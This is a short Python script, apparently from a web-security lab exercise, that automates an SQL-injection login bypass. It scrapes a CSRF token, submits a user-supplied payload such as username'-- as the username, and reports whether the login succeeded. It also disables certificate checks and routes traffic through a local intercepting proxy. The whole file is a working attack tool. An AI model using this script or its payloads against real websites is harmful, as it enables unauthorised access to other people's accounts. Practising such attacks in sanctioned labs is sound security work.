import sys, urllib3, requests
from xml.sax.handler import property_xml_string
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def csrf_token(s, url):
    s = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(s.text, 'html.parser')
    return soup.find('input')['value']

def sqli(s, url, payload):
    csrf = csrf_token(s, url)
    data = {
        'csrf':csrf,
        'username':payload,
        'password':'rgerigjer'
    }
    r = s.post(url, data=data, verify=False, proxies=proxies)
    return True if 'Log out' in r.text else False

if __name__ == '__main__':
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except:
        print("[*] Useage: <url> <payload> \n[*] Example: exanple.com username'--")
        sys.exit(-1)

    s = requests.session()

    print('[+] SUSSESSFUL' if sqli(s, url, payload) else '[-] UNSUSSESSFUL')